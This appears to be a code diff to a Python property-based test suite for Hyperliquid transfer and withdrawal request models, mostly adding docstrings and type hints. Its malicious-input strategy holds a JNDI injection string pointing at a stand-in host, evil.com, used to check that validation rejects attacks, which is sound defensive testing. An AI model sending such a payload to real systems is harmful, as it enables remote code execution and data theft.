@@ -1,7 +1,7 @@
 """Property-based tests for Hyperliquid raw API request payload models.
 
 These tests validate critical security boundary models that process external API request data.
-The models tested here are essential for transfer requests, withdrawal requests, and action payload validation.
+The models tested are essential for transfers, withdrawals, and action payload validation.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious request data that could manipulate transfer/withdrawal operations
@@ -38,13 +38,33 @@ from cyberdelta.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import EmptyStringError
 
 
+# Type alias for malicious input types to avoid long lines
+MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None
+
+
 # =============================================================================
 # HYPOTHESIS STRATEGIES FOR API REQUEST PAYLOAD MODEL TESTING
 # =============================================================================
 
 
+def _create_hex_address(hex_part: str) -> str:
+    """Create hex address with 0x prefix.
+
+    Args:
+        hex_part: Hex string without prefix.
+
+    Returns:
+        Hex address with 0x prefix.
+    """
+    return f"0x{hex_part}"
+
+
 def ethereum_address_strategy() -> SearchStrategy[str]:
-    """Generate valid Ethereum addresses."""
+    """Generate valid Ethereum addresses.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating valid Ethereum addresses.
+    """
     return st.one_of([
         # Common test addresses
         st.sampled_from([
@@ -57,14 +77,18 @@ def ethereum_address_strategy() -> SearchStrategy[str]:
         ]),
         # Generated addresses
         st.builds(
-            lambda hex_part: f"0x{hex_part}",
+            _create_hex_address,
             st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
         ),
     ])
 
 
 def token_symbol_strategy() -> SearchStrategy[str]:
-    """Generate valid token symbols."""
+    """Generate valid token symbols.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating valid token symbols.
+    """
     return st.sampled_from([
         "USDC",
         "USDT",
@@ -81,7 +105,11 @@ def token_symbol_strategy() -> SearchStrategy[str]:
 
 
 def positive_decimal_strategy() -> SearchStrategy[str]:
-    """Generate positive decimal strings for amounts."""
+    """Generate positive decimal strings for amounts.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating positive decimal strings.
+    """
     return st.one_of([
         # Common positive amounts
         st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
@@ -101,7 +129,11 @@ def positive_decimal_strategy() -> SearchStrategy[str]:
 
 
 def finite_decimal_strategy() -> SearchStrategy[str]:
-    """Generate finite decimal strings (can be negative)."""
+    """Generate finite decimal strings (can be negative).
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating finite decimal strings.
+    """
     return st.one_of([
         # Positive and negative amounts
         st.decimals(min_value=Decimal(-1000000), max_value=Decimal(1000000), places=8).map(str),
@@ -122,7 +154,11 @@ def finite_decimal_strategy() -> SearchStrategy[str]:
 
 @st.composite
 def valid_l2_usd_transfer_payload_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid L2 USD transfer payload data."""
+    """Generate valid L2 USD transfer payload data.
+
+    Returns:
+        dict[str, Any]: Valid L2 USD transfer payload data.
+    """
     return {
         "destination": draw(ethereum_address_strategy()),
         "token": draw(token_symbol_strategy()),
@@ -132,7 +168,11 @@ def valid_l2_usd_transfer_payload_data(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_l2_usd_transfer_action_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid L2 USD transfer action data."""
+    """Generate valid L2 USD transfer action data.
+
+    Returns:
+        dict[str, Any]: Valid L2 USD transfer action data.
+    """
     return {
         "chain": "L2",
         "payload": draw(valid_l2_usd_transfer_payload_data()),
@@ -141,7 +181,11 @@ def valid_l2_usd_transfer_action_data(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_l2_usd_transfer_request_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid L2 USD transfer request data."""
+    """Generate valid L2 USD transfer request data.
+
+    Returns:
+        dict[str, Any]: Valid L2 USD transfer request data.
+    """
     return {
         "type": "usdTransfer",
         "action": draw(valid_l2_usd_transfer_action_data()),
@@ -150,7 +194,11 @@ def valid_l2_usd_transfer_request_data(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_eth_withdrawal_action_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid ETH withdrawal action data."""
+    """Generate valid ETH withdrawal action data.
+
+    Returns:
+        dict[str, Any]: Valid ETH withdrawal action data.
+    """
     return {
         "destination": draw(ethereum_address_strategy()),
         "amount": draw(finite_decimal_strategy()),
@@ -159,15 +207,23 @@ def valid_eth_withdrawal_action_data(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_eth_withdrawal_request_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid ETH withdrawal request data."""
+    """Generate valid ETH withdrawal request data.
+
+    Returns:
+        dict[str, Any]: Valid ETH withdrawal request data.
+    """
     return {
         "type": "withdrawEth",
         "action": draw(valid_eth_withdrawal_action_data()),
     }
 
 
-def malicious_request_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for API request security testing."""
+def malicious_request_strategy() -> SearchStrategy[MaliciousInput]:
+    """Generate malicious values for API request security testing.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # API request manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-requests}"),
@@ -220,7 +276,7 @@ class TestHyperliquidApiL2UsdTransferRequestProperties:
     def test_l2_usd_transfer_validation_success_properties(
         self, request_data: dict[str, Any]
     ) -> None:
-        """Property: Valid L2 USD transfer request data should always create valid request objects."""
+        """Property: Valid L2 USD transfer request data should create valid request objects."""
         # Skip invalid data
         try:
             action_data = request_data["action"]
@@ -268,16 +324,16 @@ class TestHyperliquidApiL2UsdTransferRequestProperties:
         malicious_value=malicious_request_strategy(),
     )
     def test_l2_usd_transfer_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: L2 USD transfer request should reject malicious inputs safely."""
+        """Property: L2 USD transfer request should reject malicious inputs."""
         # Create valid base data
         payload_model = HyperliquidRawL2UsdTransferPayload(
             destination="0x1234567890abcdef1234567890abcdef12345678", token="USDC", amount="100.0"
         )
         action_model = HyperliquidRawL2UsdTransferActionDetails(chain="L2", payload=payload_model)
 
-        base_data = {
+        base_data: dict[str, object] = {
             "type": "usdTransfer",
             "action": action_model,
         }
@@ -398,7 +454,7 @@ class TestHyperliquidApiEthWithdrawalRequestProperties:
     def test_eth_withdrawal_validation_success_properties(
         self, request_data: dict[str, Any]
     ) -> None:
-        """Property: Valid ETH withdrawal request data should always create valid request objects."""
+        """Property: Valid ETH withdrawal request data should create valid request objects."""
         # Skip invalid data
         try:
             action_data = request_data["action"]
@@ -439,15 +495,15 @@ class TestHyperliquidApiEthWithdrawalRequestProperties:
         malicious_value=malicious_request_strategy(),
     )
     def test_eth_withdrawal_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: ETH withdrawal request should reject malicious inputs safely."""
+        """Property: ETH withdrawal request should reject malicious inputs."""
         # Create valid base data
         action_model = HyperliquidRawEthWithdrawalActionPayload(
             destination="0x1234567890abcdef1234567890abcdef12345678", amount="1.0"
         )
 
-        base_data = {
+        base_data: dict[str, object] = {
             "type": "withdrawEth",
             "action": action_model,
         }
@@ -563,7 +619,7 @@ class TestHyperliquidApiRequestPayloadIntegrationProperties:
         self,
         l2_request_data: dict[str, Any],
         eth_request_data: dict[str, Any],
-        malicious_payload: Any,
+        malicious_payload: MaliciousInput,
     ) -> None:
         """Property: Request models should work consistently together."""
         # Skip invalid data for L2 request
@@ -638,7 +694,7 @@ class TestHyperliquidApiRequestPayloadIntegrationProperties:
     def test_request_models_adversarial_input_properties(
         self, complete_malicious_data: dict[str, Any]
     ) -> None:
-        """Property: All request models should safely handle complete adversarial input."""
+        """Property: All request models should handle adversarial input safely."""
         # Property: Complete adversarial input should be safely rejected by both models
         with pytest.raises((ValidationError, TypeError)):
             HyperliquidApiL2UsdTransferRequest.model_validate(complete_malicious_data)
